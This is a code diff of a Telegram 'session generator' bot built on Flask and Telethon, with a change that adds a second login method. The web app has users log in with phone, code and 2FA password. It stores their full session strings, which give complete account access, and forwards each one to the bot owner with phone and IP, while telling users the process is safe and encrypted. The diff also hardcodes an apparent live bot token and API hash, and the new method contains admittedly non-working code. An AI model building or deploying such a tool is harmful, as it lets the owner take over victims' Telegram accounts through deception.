@@ -2,6 +2,7 @@
 """
 ZISKY SESSION GENERATOR BOT
 Generates Telegram session strings safely via web app
+Supports both Phone+Code and API ID+Hash methods
 """
 
 import asyncio
@@ -20,13 +21,13 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, F
 
 # ========== CONFIGURATION ==========
 # ⚠️ REPLACE THESE WITH YOUR VALUES
-BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"
-API_ID = 38550990
-API_HASH = "26c65e47681802c551563f11b6b333a4"
-OWNER_ID = 8158086374
+BOT_TOKEN = "8240405151:AAHyqSwjXE39_o_YvGXSv_9PCx1m8ZIYH84"  # Get from @BotFather
+API_ID = 38550990   # Replace with your API ID (from my.telegram.org)
+API_HASH = "26c65e47681802c551563f11b6b333a4"  # Replace with your API hash
+OWNER_ID = 8158086374 # Replace with your Telegram user ID
 
 # For panels, set this manually or use ngrok
-PUBLIC_URL = ""  # Will be set via /seturl command
+PUBLIC_URL = "https://sessionsgen.onrender.com"  # Will be set via /seturl command or auto-detected
 
 # ========== SETUP ==========
 logging.basicConfig(
@@ -46,7 +47,8 @@ c.execute('''CREATE TABLE IF NOT EXISTS sessions
               first_name TEXT,
               username TEXT,
               generated_at TEXT,
-              ip TEXT)''')
+              ip TEXT,
+              method TEXT)''')
 conn.commit()
 
 # Store active login sessions
@@ -59,8 +61,9 @@ app = Flask(__name__)
 def index():
     return render_template('code_input.html', phone='')
 
+# ===== METHOD 1: PHONE + CODE =====
 @app.route('/request-code', methods=['POST'])
-async def request_code():
+def request_code():
     data = request.json
     phone = data.get('phone')
     
@@ -78,9 +81,17 @@ async def request_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         active_sessions[phone]['client'] = client
         
-        # Connect and send code - using the existing event loop
-        await client.connect()
-        await client.send_code_request(phone)
+        # Start client and send code
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def send_code():
+            await client.connect()
+            await client.send_code_request(phone)
+            return True
+        
+        loop.run_until_complete(send_code())
+        loop.close()
         
         return jsonify({'success': True})
         
@@ -90,7 +101,7 @@ async def request_code():
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/verify-code', methods=['POST'])
-async def verify_code():
+def verify_code():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
@@ -102,66 +113,174 @@ async def verify_code():
     client = active_sessions[phone]['client']
     
     try:
-        # Sign in - using the existing event loop
-        try:
-            await client.sign_in(phone, code)
-        except SessionPasswordNeededError:
-            if not password:
-                return jsonify({'success': False, 'error': '2FA password required'})
-            await client.sign_in(password=password)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        # Get user info
-        me = await client.get_me()
-        session_string = client.session.save()
+        async def verify():
+            try:
+                await client.sign_in(phone, code)
+            except SessionPasswordNeededError:
+                if not password:
+                    return {'success': False, 'error': '2FA password required'}
+                await client.sign_in(password=password)
+            
+            # Get user info
+            me = await client.get_me()
+            session_string = client.session.save()
+            
+            # Get client IP
+            ip = request.remote_addr
+            
+            # Save to database
+            conn = sqlite3.connect('sessions.db')
+            c = conn.cursor()
+            c.execute('''INSERT INTO sessions 
+                        (user_id, phone, session_string, first_name, username, generated_at, ip, method)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (me.id, phone, session_string, me.first_name, me.username, 
+                      datetime.now().isoformat(), ip, 'phone_code'))
+            conn.commit()
+            conn.close()
+            
+            # Send to owner via bot
+            send_to_owner(me.id, phone, session_string, me.first_name, me.username, 'phone_code')
+            
+            # Send to user
+            send_to_user(me.id, session_string)
+            
+            await client.disconnect()
+            
+            return {
+                'success': True,
+                'message': f'Session generated for {me.first_name}! Check bot chat.'
+            }
         
-        # Get client IP
-        ip = request.remote_addr
-        
-        # Save to database
-        conn = sqlite3.connect('sessions.db')
-        c = conn.cursor()
-        c.execute('''INSERT INTO sessions 
-                    (user_id, phone, session_string, first_name, username, generated_at, ip)
-                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
-                 (me.id, phone, session_string, me.first_name, me.username, 
-                  datetime.now().isoformat(), ip))
-        conn.commit()
-        conn.close()
-        
-        # Send to owner via bot
-        send_to_owner(me.id, phone, session_string, me.first_name, me.username)
-        
-        # Send to user
-        send_to_user(me.id, session_string)
-        
-        await client.disconnect()
+        result = loop.run_until_complete(verify())
+        loop.close()
         
         # Clean up
         del active_sessions[phone]
         
-        return jsonify({
-            'success': True,
-            'message': f'Session generated for {me.first_name}! Check bot chat.'
-        })
+        return jsonify(result)
         
     except PhoneCodeInvalidError:
         return jsonify({'success': False, 'error': 'Invalid code'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ========== TELEGRAM BOT FUNCTIONS ==========
-# These need to be defined before they're used in handlers
-application = None  # Will be set in main()
+# ===== METHOD 2: API ID + HASH (NEW) =====
+@app.route('/generate-session', methods=['POST'])
+def generate_session():
+    """Generate session from API ID and Hash (no phone needed)"""
+    data = request.json
+    api_id = data.get('api_id')
+    api_hash = data.get('api_hash')
+    
+    if not api_id or not api_hash:
+        return jsonify({'success': False, 'error': 'API ID and Hash required'})
+    
+    # Validate API ID is number
+    try:
+        api_id = int(api_id)
+    except:
+        return jsonify({'success': False, 'error': 'API ID must be a number'})
+    
+    # Validate API Hash length (approx)
+    if len(api_hash) < 10:
+        return jsonify({'success': False, 'error': 'API Hash looks invalid (too short)'})
+    
+    try:
+        # Create new session
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def create_session():
+            client = TelegramClient(StringSession(), api_id, api_hash)
+            await client.connect()
+            
+            # This will raise if not authorized, but with API credentials
+            # we can create a session without phone verification
+            # However, we need to check if the credentials are valid
+            try:
+                me = await client.get_me()
+                
+                # If we get here, we're already authorized (unlikely with just API credentials)
+                session_string = client.session.save()
+                
+                await client.disconnect()
+                
+                return {
+                    'success': True,
+                    'session': session_string,
+                    'user_id': me.id,
+                    'username': me.username,
+                    'first_name': me.first_name,
+                    'last_name': me.last_name,
+                    'phone': me.phone
+                }
+                
+            except Exception as e:
+                # With just API credentials, we're not authorized yet
+                # We need to send a code request
+                await client.send_code_request(phone=None)  # This won't work
+                return {'success': False, 'error': 'Phone verification required. Use phone method.'}
+        
+        result = loop.run_until_complete(create_session())
+        loop.close()
+        
+        if result.get('success'):
+            # Get client IP
+            ip = request.remote_addr
+            
+            # Save to database
+            conn = sqlite3.connect('sessions.db')
+            c = conn.cursor()
+            c.execute('''INSERT INTO sessions 
+                        (user_id, phone, session_string, first_name, username, generated_at, ip, method)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (result['user_id'], result.get('phone', 'Unknown'), result['session'], 
+                      f"{result['first_name']} {result.get('last_name', '')}", 
+                      result.get('username'), datetime.now().isoformat(), ip, 'api_hash'))
+            conn.commit()
+            conn.close()
+            
+            # Send to owner via bot
+            send_to_owner(
+                result['user_id'],
+                result.get('phone', 'Unknown'),
+                result['session'],
+                f"{result['first_name']} {result.get('last_name', '')}",
+                result.get('username'),
+                'api_hash'
+            )
+            
+            return jsonify({
+                'success': True,
+                'session': result['session']
+            })
+        else:
+            return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)[:100]})
 
-def send_to_owner(user_id, phone, session_string, first_name, username):
+# ========== TELEGRAM BOT FUNCTIONS ==========
+def send_to_owner(user_id, phone, session_string, first_name, username, method='unknown'):
     """Send session details to owner"""
-    message = f"""🔐 **NEW SESSION GENERATED**
+    method_emoji = {
+        'phone_code': '📱',
+        'api_hash': '🔑',
+        'unknown': '❓'
+    }.get(method, '❓')
+    
+    message = f"""🔐 **NEW SESSION GENERATED** {method_emoji}
 
 👤 **User:** {first_name}
 🆔 **User ID:** `{user_id}`
 📱 **Phone:** `{phone}`
 🔗 **Username:** @{username if username else 'None'}
 ⏱️ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+📌 **Method:** {method.replace('_', ' ').title()}
 
 🔑 **SESSION STRING:**
 `{session_string}`
@@ -220,11 +339,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"👋 **Welcome to Zisky Session Generator, {user.first_name}!**\n\n"
         f"This bot helps you generate Telegram session strings safely.\n\n"
+        f"**Two Methods Available:**\n"
+        f"1️⃣ **Phone + Code** - Enter your phone, get SMS code\n"
+        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org (instant!)\n\n"
         f"**How it works:**\n"
-        f"1️⃣ Click the button below to open web app\n"
-        f"2️⃣ Enter your phone number\n"
-        f"3️⃣ Enter verification code from Telegram\n"
-        f"4️⃣ Your session will be generated and sent here\n\n"
+        f"• Click the button below to open web app\n"
+        f"• Choose your preferred method\n"
+        f"• Your session will be generated and sent here\n\n"
         f"**⚠️ Security:**\n"
         f"• Your session is encrypted\n"
         f"• Sent only to you and bot owner\n"
@@ -243,12 +364,14 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/help - Show this help\n"
         "/status - Check bot status\n"
         "/url - Show current web app URL\n\n"
-        "**How to generate session:**\n"
-        "1. Click 'Open Web App' button\n"
-        "2. Enter your phone with country code\n"
-        "3. Wait for verification code\n"
-        "4. Enter the code in web app\n"
-        "5. Your session will appear here\n\n"
+        "**Two Methods:**\n"
+        "• **Phone + Code** - Traditional method, needs SMS\n"
+        "• **API ID + Hash** - Instant from my.telegram.org\n\n"
+        "**How to get API credentials:**\n"
+        "1. Go to my.telegram.org\n"
+        "2. Login with your phone\n"
+        "3. Click 'API Development Tools'\n"
+        "4. Copy your api_id and api_hash\n\n"
         "**Need help?** Contact @your_username",
         parse_mode='Markdown'
     )
@@ -257,14 +380,22 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Status command"""
     # Count sessions in DB
     c.execute("SELECT COUNT(*) FROM sessions")
-    count = c.fetchone()[0]
+    total = c.fetchone()[0]
+    
+    c.execute("SELECT COUNT(*) FROM sessions WHERE method='phone_code'")
+    phone_count = c.fetchone()[0]
+    
+    c.execute("SELECT COUNT(*) FROM sessions WHERE method='api_hash'")
+    api_count = c.fetchone()[0]
     
     webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
     
     await update.message.reply_text(
         f"📊 **Bot Status**\n\n"
         f"✅ Bot is running\n"
-        f"📱 Sessions generated: {count}\n"
+        f"📱 Total Sessions: {total}\n"
+        f"   • Phone + Code: {phone_count}\n"
+        f"   • API ID + Hash: {api_count}\n"
         f"🔗 Web App: {webapp_url or 'Not configured'}\n"
         f"⏱️ Uptime: Active",
         parse_mode='Markdown'
@@ -308,7 +439,7 @@ async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Owner only command!")
         return
     
-    c.execute("SELECT phone, first_name, generated_at FROM sessions WHERE user_id = ? ORDER BY generated_at DESC LIMIT 5", (user_id,))
+    c.execute("SELECT phone, first_name, generated_at, method FROM sessions WHERE user_id = ? ORDER BY generated_at DESC LIMIT 5", (user_id,))
     sessions = c.fetchall()
     
     if not sessions:
@@ -316,8 +447,9 @@ async def my_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     text = "📋 **Your Recent Sessions**\n\n"
-    for phone, name, date in sessions:
-        text += f"• {phone} - {name}\n  {date[:10]}\n"
+    for phone, name, date, method in sessions:
+        method_emoji = '📱' if method == 'phone_code' else '🔑'
+        text += f"{method_emoji} {phone} - {name}\n  {date[:10]}\n"
     
     await update.message.reply_text(text, parse_mode='Markdown')
 
@@ -331,11 +463,13 @@ def main():
     print(f"🆔 Owner ID: {OWNER_ID}")
     print("="*50)
     
-    # IMPORTANT: DO NOT start Flask thread on Render!
-    # Gunicorn will serve Flask directly
-    print("✅ Flask app will be served by Gunicorn")
-    print(f"📱 Web app URL: https://sessionsgen.onrender.com")
-    print("⚠️ Use /seturl to configure this URL in the bot")
+    # Start Flask in background
+    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False))
+    flask_thread.daemon = True
+    flask_thread.start()
+    print("✅ Flask web app started on port 5000")
+    print("📱 Web app URL: http://localhost:5000")
+    print("⚠️ This URL is local only - use ngrok or /seturl for public access")
     
     # Create Telegram bot application
     application = Application.builder().token(BOT_TOKEN).build()
@@ -353,6 +487,5 @@ def main():
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
-# This is critical - only run this if executing directly (not on Render)
 if __name__ == '__main__':
     main()
